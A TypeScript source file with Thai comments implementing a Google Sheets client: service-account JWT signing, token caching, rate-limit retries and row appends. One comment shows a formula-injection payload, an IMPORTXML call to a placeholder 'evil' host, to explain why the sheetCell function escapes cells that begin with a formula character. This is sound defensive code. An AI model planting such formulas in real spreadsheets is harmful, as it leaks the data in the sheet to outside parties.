import { createSign } from "node:crypto";
import { z } from "zod";

const serviceAccountSchema = z.object({
  client_email: z.email(),
  private_key: z.string().min(1),
  token_uri: z.url().optional(),
});
export type ServiceAccount = z.infer<typeof serviceAccountSchema>;

/**
 * ข้อความที่ขึ้นต้นด้วย = + - @ ถูก Sheets ตีความเป็นสูตร (USER_ENTERED) — ชื่อเว็บอย่าง
 * `=IMPORTXML("https://evil/?"&A2, …)` จะส่งข้อมูลในชีตออกไปภายนอกได้ → ใส่ ' นำหน้าให้เป็นข้อความธรรมดา
 * (แบบเดียวกับไฟล์ CSV) · ตัวเลขและวันที่ยังเป็นค่าที่คำนวณ/เรียงได้ตามปกติ
 */
export function sheetCell(c: string | number | null): string | number {
  if (c === null) return "";
  if (typeof c === "number") return c;
  return /^[=+\-@\t\r]/.test(c) ? `'${c}` : c;
}

export class SheetsError extends Error {
  constructor(
    message: string,
    readonly status?: number,
  ) {
    super(message);
    this.name = "SheetsError";
  }
}

/** อ่าน GOOGLE_SERVICE_ACCOUNT_JSON (JSON ทั้งก้อน หรือ base64 ของ JSON) */
export function parseServiceAccount(raw: string | undefined): ServiceAccount | null {
  if (!raw || !raw.trim()) return null;
  const text = raw.trim().startsWith("{") ? raw : Buffer.from(raw, "base64").toString("utf8");
  try {
    const parsed = serviceAccountSchema.parse(JSON.parse(text));
    return { ...parsed, private_key: parsed.private_key.replace(/\\n/g, "\n") };
  } catch {
    return null;
  }
}

export interface SheetsClientOptions {
  /** แทนที่ได้ในเทสต์ */
  apiBase?: string;
  fetchImpl?: typeof fetch;
  /** จำนวนครั้งที่ลองใหม่เมื่อเจอ 429 (ค่าเริ่มต้น 3) */
  maxRetries?: number;
  retryBaseMs?: number;
}

const SCOPE = "https://www.googleapis.com/auth/spreadsheets";

export class SheetsClient {
  private token: { value: string; expiresAt: number } | null = null;
  private readonly apiBase: string;
  private readonly fetchImpl: typeof fetch;
  private readonly maxRetries: number;
  private readonly retryBaseMs: number;

  constructor(
    private readonly sa: ServiceAccount,
    private readonly spreadsheetId: string,
    opts: SheetsClientOptions = {},
  ) {
    this.apiBase = (opts.apiBase ?? "https://sheets.googleapis.com").replace(/\/$/, "");
    this.fetchImpl = opts.fetchImpl ?? fetch;
    this.maxRetries = opts.maxRetries ?? 3;
    this.retryBaseMs = opts.retryBaseMs ?? 2_000;
  }

  /** JWT RS256 ตาม OAuth 2.0 service account flow */
  buildAssertion(nowSec = Math.floor(Date.now() / 1000)): string {
    const b64 = (o: object) => Buffer.from(JSON.stringify(o)).toString("base64url");
    const header = b64({ alg: "RS256", typ: "JWT" });
    const claims = b64({
      iss: this.sa.client_email,
      scope: SCOPE,
      aud: this.sa.token_uri ?? "https://oauth2.googleapis.com/token",
      iat: nowSec,
      exp: nowSec + 3600,
    });
    const signer = createSign("RSA-SHA256");
    signer.update(`${header}.${claims}`);
    return `${header}.${claims}.${signer.sign(this.sa.private_key).toString("base64url")}`;
  }

  private async accessToken(): Promise<string> {
    if (this.token && this.token.expiresAt > Date.now() + 60_000) return this.token.value;
    const res = await this.fetchImpl(this.sa.token_uri ?? "https://oauth2.googleapis.com/token", {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
        assertion: this.buildAssertion(),
      }),
      signal: AbortSignal.timeout(20_000),
    });
    if (!res.ok) throw new SheetsError(`ขอ access token ไม่สำเร็จ (${res.status})`, res.status);
    const body = (await res.json()) as { access_token?: string; expires_in?: number };
    if (!body.access_token) throw new SheetsError("ไม่ได้รับ access token");
    this.token = { value: body.access_token, expiresAt: Date.now() + (body.expires_in ?? 3600) * 1000 };
    return body.access_token;
  }

  /**
   * 429 (โควตาต่อนาทีของ Google) = คำขอถูกปฏิเสธ ไม่ได้ทำ → รอแล้วลองใหม่ได้แม้เป็นการเขียน
   * 5xx/timeout ของการเขียน = ไม่รู้ว่าเขียนไปแล้วหรือยัง → ไม่ลองซ้ำเอง (ผู้เรียกตรวจแถวซ้ำรอบหน้า)
   */
  private async call(path: string, init: RequestInit = {}, attempt = 0): Promise<unknown> {
    const token = await this.accessToken();
    const res = await this.fetchImpl(
      `${this.apiBase}/v4/spreadsheets/${encodeURIComponent(this.spreadsheetId)}${path}`,
      {
        ...init,
        headers: { authorization: `Bearer ${token}`, "content-type": "application/json", ...init.headers },
        signal: AbortSignal.timeout(30_000),
      },
    );
    const isRead = (init.method ?? "GET") === "GET";
    if ((res.status === 429 || (isRead && res.status >= 500)) && attempt < this.maxRetries) {
      await res.body?.cancel().catch(() => undefined);
      const retryAfter = Number(res.headers.get("retry-after"));
      const waitMs = retryAfter > 0 ? Math.min(retryAfter * 1000, 60_000) : this.retryBaseMs * 2 ** attempt;
      await new Promise((r) => setTimeout(r, waitMs));
      return this.call(path, init, attempt + 1);
    }
    if (!res.ok) {
      const detail = (await res.text().catch(() => "")).slice(0, 200);
      const hint =
        res.status === 403
          ? " — แชร์ชีตให้อีเมล service account แล้วหรือยัง"
          : res.status === 429
            ? " — เกินโควตาของ Google Sheets จะลองใหม่รอบถัดไป"
            : res.status === 400 && /limit|cells/i.test(detail)
              ? " — สเปรดชีตเต็ม (Google จำกัด 10 ล้านเซลล์ต่อไฟล์) ย้ายชีตเก่าไปไฟล์อื่นหรือลบทิ้ง"
              : "";
      throw new SheetsError(`Sheets API ${res.status}${hint} ${detail}`.trim(), res.status);
    }
    return res.json();
  }

  /**
   * ค่าในคอลัมน์ (เช่น "A:A") ทุกแถว เป็นข้อความ — ใช้ตรวจแถวที่ส่งไปแล้ว
   * (ค่าดิบ: ตัวเลขเป็นตัวเลข, วันที่เป็นเลข serial ของ Sheets — ผู้เรียกแปลงเอง)
   */
  async columnValues(title: string, columns: string): Promise<string[][]> {
    const range = encodeURIComponent(`'${title.replace(/'/g, "''")}'!${columns}`);
    const body = (await this.call(
      `/values/${range}?majorDimension=ROWS&valueRenderOption=UNFORMATTED_VALUE`,
    )) as {
      values?: unknown[][];
    };
    return (body.values ?? []).map((row) =>
      row.map((v) => (typeof v === "number" ? String(v) : String(v ?? ""))),
    );
  }

  async sheetTitles(): Promise<string[]> {
    const body = (await this.call("?fields=sheets.properties.title")) as {
      sheets?: Array<{ properties?: { title?: string } }>;
    };
    return (body.sheets ?? []).map((s) => s.properties?.title ?? "").filter(Boolean);
  }

  /** สร้างชีตพร้อมแถวหัวตาราง ถ้ายังไม่มี */
  async ensureSheet(title: string, header: string[]): Promise<void> {
    const titles = await this.sheetTitles();
    if (titles.includes(title)) return;
    await this.call(":batchUpdate", {
      method: "POST",
      body: JSON.stringify({ requests: [{ addSheet: { properties: { title } } }] }),
    });
    await this.append(title, [header]);
  }

  async append(title: string, rows: Array<Array<string | number | null>>): Promise<number> {
    if (rows.length === 0) return 0;
    const range = encodeURIComponent(`'${title.replace(/'/g, "''")}'!A1`);
    await this.call(`/values/${range}:append?valueInputOption=USER_ENTERED&insertDataOption=INSERT_ROWS`, {
      method: "POST",
      body: JSON.stringify({ values: rows.map((r) => r.map(sheetCell)) }),
    });
    return rows.length;
  }
}
